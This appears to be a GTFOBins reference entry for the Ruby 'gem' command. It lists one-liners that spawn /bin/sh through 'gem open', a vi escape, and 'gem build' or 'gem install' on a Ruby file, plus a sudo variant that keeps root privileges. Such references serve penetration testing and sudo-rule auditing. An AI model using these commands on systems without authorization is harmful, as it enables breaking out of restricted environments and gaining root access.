# GTFOBin: gem

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

This requires the name of an installed gem to be provided (`rdoc` is usually installed).

```
gem open -e "/bin/sh -c /bin/sh" rdoc
```

This invokes the default editor, which is likely to be `vi`, other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed).

```
gem open rdoc
:!/bin/sh
```

This executes the specified file as `ruby` code.

```
TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/x
gem build $TF/x
```

This executes the specified file as `ruby` code.

```
TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/x
gem install --file $TF/x
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This requires the name of an installed gem to be provided (`rdoc` is usually installed).

```
sudo gem open -e "/bin/sh -c /bin/sh" rdoc
```